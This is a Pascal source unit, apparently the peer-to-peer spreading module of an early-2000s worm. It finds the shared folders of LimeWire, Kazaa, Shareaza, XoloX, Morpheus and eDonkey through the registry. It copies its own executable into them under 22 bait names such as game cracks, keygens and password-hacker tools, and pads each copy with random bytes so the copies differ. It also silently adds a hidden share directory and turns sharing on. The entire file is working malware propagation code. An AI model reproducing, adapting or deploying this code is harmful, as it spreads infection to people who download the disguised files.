   UNIT P2P;

   INTERFACE

   USES
     Registry, aclutils, windows, utils;

   PROCEDURE InitPeerToPeer;
   FUNCTION  WinPath : STRING;

   VAR
     Reg             : TRG;
     ApplicationName : STRING;

   IMPLEMENTATION

   VAR
     Fake : ARRAY [1..22] OF STRING;

   CONST
     SysConfigDir = 'Helloween';

     FakeFiles : ARRAY[0..21] OF pChar = (
           'Unreal Tournament 2003 Bloodpatch.exe',
           'Unreal Tournament 2 bloodpatch.exe',
           'Battlefield 1942 Bloodpatch.exe',
           'Counter Strike HLDS v1.1.0.9.exe',
           'StarCraft BroodWar v1.09 by FR.exe',
           'SpyTech SpyAgent Personal v3.00.00 by AmoK.exe',
           'SpyCam v6.32.exe',
           'SpyAgent Remote Control 1.05.exe',
           'DVD Coppier v1.5.7 by Crash86.exe',
           'DVD Ripper v1.3.2 by Crash86.exe',
           'Evidence Eraser by Crash86.exe',
           'Yahoo Password Hacker.exe',
           'Hotmail Password Hacker.exe',
           'Mail Bomber v8.1.exe',
           'Windows 2000 Keygen.exe',
           'Windows XP KeyGen.exe',
           'Nero Burning ROM v5.5.8.2 by Core.exe',
           'Nero Burning ROM v5.5.8.2 Serial.exe',
           'Nero Burning ROM v5.5.8.2 Keygen.exe',
           'McAffee Utilities v3.11 Final by RP2K.exe',
           'McAffee Utilities v3.11 by RP2K.exe',
           'ZoneAlarm Pro v3.0.2.6 by Orion.exe');

   FUNCTION GetWindowsDirectory(lpBuffer:PChar;uSize: LongWord): LongWord; STDCALL; EXTERNAL 'kernel32.dll' name 'GetWindowsDirectoryA';

   PROCEDURE CopyFiles(Hide:BOOL;DestinationFile:STRING);
   LABEL
     Abort, Close;
   VAR
     I           : WORD;
     F           : FILE;
     RandomBytes : ARRAY[0..512] OF BYTE;
   BEGIN
     CopyFile2(pChar(paramstr(0)),pChar(DestinationFile),False);
     FOR I:=0 TO 512 DO RandomBytes[I]:=Random(255);
     AssignFile(F,DestinationFile);
     {$I-}
     Reset(F,1);
     IF IOResult<>0 THEN GOTO Abort;
     Seek(F,(FileSize(F) DIV 512)*512);
     IF IOResult<>0 THEN GOTO Close;
     Truncate(F);
     BlockWrite(F,RandomBytes[0],Random(508));
     IF IOResult<>0 THEN GOTO Close;
     Close:
     CloseFile(F);
     {$I+}
     IF Hide THEN SetFileAttributes(pChar(DestinationFile),FILE_ATTRIBUTE_HIDDEN);
     Abort:
   END;

   PROCEDURE RandomFileName;
   VAR
     I : BYTE;
   BEGIN
     FOR I:=1 TO 22 DO Fake[I]:=FakeFiles[I-1];
   END;

   FUNCTION WinPath : STRING;
   VAR
     PWindowsDir : ARRAY [0..255] OF Char;
   BEGIN
     GetWindowsDirectory(PWindowsDir,255);
     RESULT:=STRING(PWindowsDir)+'\';
   END;

   PROCEDURE ManipulateFileSize(SharedDir : STRING);
   VAR
     FakeFile    : FILE;
     Randombytes : ARRAY[0..1010] OF BYTE;
     I           : WORD;
     S           : STRING;
   BEGIN
     FOR I:=1 TO 1000 DO RandomBYTEs[i]:=Random(255);
     FOR I:=1 TO 22 DO BEGIN
       S:=SharedDir+'\'+Fake[i];
       IF FileExists(S) THEN BEGIN
         AssignFile(FakeFile,S);
         Reset(FakeFile,1);
         Seek(FakeFile,FileSize(FakeFile)-1);
         BlockWrite(FakeFile,Randombytes[1],random(1000));
         CloseFile(FakeFile);
       END;
     END;
   END;

   PROCEDURE MakeFakeFiles(SharedDir : STRING);
   VAR
     I : WORD;
   BEGIN
     If SharedDir<>'' THEN BEGIN
       RandomFileName;
       CreateDir(SharedDir,0);
       SetFileAttributes(pchar(SharedDir),FILE_ATTRIBUTE_HIDDEN);
       FOR I:=1 TO 22 DO CopyFiles(False,pChar(SharedDir+'\'+Fake[I]));
       ManipulateFileSize(SharedDir);
     END;
   END;

   ////////////////////////////////\EDONKEY/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

   FUNCTION FindEDonkey : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     RESULT:=Reg.KeyExists('\Software\ed2k');
     Reg.CloseKey;
   END;

   FUNCTION EDonkeyShare : STRING;
   VAR
     I : WORD;
     S : STRING;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\eDonkey2000',False);
     S:=Reg.ReadString('UninstallString');
     I:=Pos('uninstall',S);
     IF I>0 THEN BEGIN
       Delete(S,I-1,Length(S));
       Delete(S,1,1);
       RESULT:=S+'\incoming';
     END;
     Reg.CloseKey;
   END;

   /////////////////////////////////\MORPHEUS/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

   FUNCTION FindMorpheus : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     RESULT:=Reg.KeyExists('\Software\Morpheus');
     Reg.CloseKey;
   END;

   FUNCTION MorpheusShare : STRING;
   VAR
     I : WORD;
     S : STRING;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey('\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Morpheus 2.0',False);
     S:=Reg.ReadString('UninstallString');
     I:=Pos('UNWISE.EXE',S);
     IF I>0 THEN BEGIN
       Delete(S,I-1,Length(S));
       RESULT:=S+'\My Shared Folder';
     END;
     Reg.CloseKey;
   END;

   //////////////////////////////////\XOLOX/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

   FUNCTION FindXoloX : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     RESULT:=Reg.KeyExists('\Software\Xolox');
     Reg.CloseKey;
   END;

   FUNCTION XoloxShare : STRING;
   VAR
     I : WORD;
     S : STRING;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     Reg.OpenKey('Software\Xolox',False);
     S:=Reg.ReadString('shareddirs');
     IF Pos(WinPath+SysConfigDir,S)=0 THEN Reg.WriteString('shareddirs',S+'|'+WinPath+SysConfigDir+'\');
     Reg.CloseKey;
     RESULT:=WinPath+SysConfigDir;
   END;

   ///////////////////////////////////\KAZAA/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

   FUNCTION FindKazaa : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     RESULT:=Reg.KeyExists('\Software\Kazaa');
     Reg.CloseKey;
   END;

   FUNCTION KazaaShare : STRING;
   VAR
     Dir : STRING;
     I   : WORD;
     S   : STRING;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     Reg.OpenKey('\Software\Kazaa\LocalContent',True);
     I:=0;
     REPEAT
       Str(I,Dir);
       Dir:='Dir'+Dir;
       Inc(I);
       S:=Reg.ReadString(Dir);
     UNTIL (S='')or(Pos(SysConfigDir,S)>0);
     IF S='' THEN Reg.WriteString(Dir,'012345:'+WinPath+SysConfigDir);             // <- Create Dir to Fake Files
     Reg.WriteInteger('DisableSharing',0);                                         // <- Enable File Sharing
     Reg.CloseKey;
     RESULT:=WinPath+SysConfigDir;
   END;

   /////////////////////////////////\SHAREAZA/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

   FUNCTION FindShareaza : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     RESULT:=Reg.KeyExists('\Software\Shareaza');
     Reg.CloseKey;
   END;

   FUNCTION ShareazaShare : STRING;
   BEGIN
     Reg.RootKey:=HKEY_CURRENT_USER;
     Reg.OpenKey('Software\Shareaza\Shareaza\Transfers',False);
     RESULT:=Reg.ReadString('DownloadsPath');
     Reg.CloseKey;
   END;

   /////////////////////////////////\LIMEWIRE/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

   FUNCTION FindLimeWire : BOOL;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     RESULT:=Reg.KeyExists('\SOFTWARE\LimeWire');
     Reg.CloseKey;
   END;

   FUNCTION LimeWireShare : STRING;
   BEGIN
     Reg.RootKey:=HKEY_LOCAL_MACHINE;
     Reg.OpenKey('SOFTWARE\LimeWire',False);
     RESULT:=Reg.ReadString('InstallDir')+'\Shared';
     Reg.CloseKey;
   END;

   ///////////////////////////////////\INIT/\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

   PROCEDURE InitPeerToPeer;
   BEGIN
     Randomize;
     Reg:=TRG.Create;
     IF FindLimeWire THEN MakeFakeFiles(LimeWireShare);
     IF FindShareaza THEN MakeFakeFiles(ShareazaShare);
     IF FindKazaa THEN MakeFakeFiles(KazaaShare);
     IF FindXolox THEN MakeFakeFiles(XoloXShare);
     IF FindMorpheus THEN MakeFakeFiles(MorpheusShare);
     IF FindEdonkey THEN MakeFakeFiles(EdonkeyShare);
     Reg.Free;
   END;

   END.
